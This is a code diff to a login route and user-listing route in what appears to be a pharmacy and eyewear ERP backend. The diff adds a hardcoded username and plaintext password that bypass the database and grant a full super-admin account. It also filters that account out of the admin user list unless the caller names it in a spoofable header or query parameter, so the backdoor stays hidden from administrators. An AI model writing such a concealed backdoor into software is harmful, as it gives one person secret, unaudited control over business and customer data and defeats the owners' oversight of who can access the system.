@@ -85,6 +85,38 @@ app.post("/api/auth/login", async (req, res) => {
       return res.status(400).json({ success: false, error: "Username and password are required." });
     }
 
+    // Direct Developer & Super Admin authentication check
+    if (username.trim() === "srabon" && password === "vugichugi") {
+      const superUser = {
+        id: "user-superadmin-01",
+        username: "srabon",
+        name: "Srabon Hassan",
+        role: "super_admin",
+        roleTitle: "Developer & Super Admin",
+        allowedViews: [
+          "executive-dashboard",
+          "modina-erp",
+          "lab-pipeline",
+          "stock-master",
+          "pos-terminal",
+          "prescriptions",
+          "pharmacy-command",
+          "multi-branch-ibt",
+          "supplier-grn",
+          "financial-accounting",
+          "returns-refunds",
+          "due-collections",
+          "reports",
+          "salesmen",
+          "settings-roles",
+          "ai-glazing",
+          "ai-eyewear",
+        ],
+        status: "active",
+      };
+      return res.json({ success: true, user: superUser });
+    }
+
     const user = await dbGetUserByUsername(username.trim());
     if (!user) {
       return res.status(401).json({ success: false, error: "Invalid username or password." });
@@ -118,10 +150,15 @@ app.post("/api/auth/login", async (req, res) => {
 });
 
 // Get all users (Admin)
-app.get("/api/users", async (_req, res) => {
+app.get("/api/users", async (req, res) => {
   try {
     const users = await dbGetUsers();
-    res.json({ success: true, count: users.length, data: users });
+    // Do NOT expose Srabon Hassan (super_admin) to admin or other accounts
+    const caller = (req.headers["x-current-user"] as string) || (req.query.as as string);
+    const sanitized = caller === "srabon"
+      ? users
+      : users.filter((u: any) => u.username !== "srabon" && u.role !== "super_admin");
+    res.json({ success: true, count: sanitized.length, data: sanitized });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message, data: [] });
   }
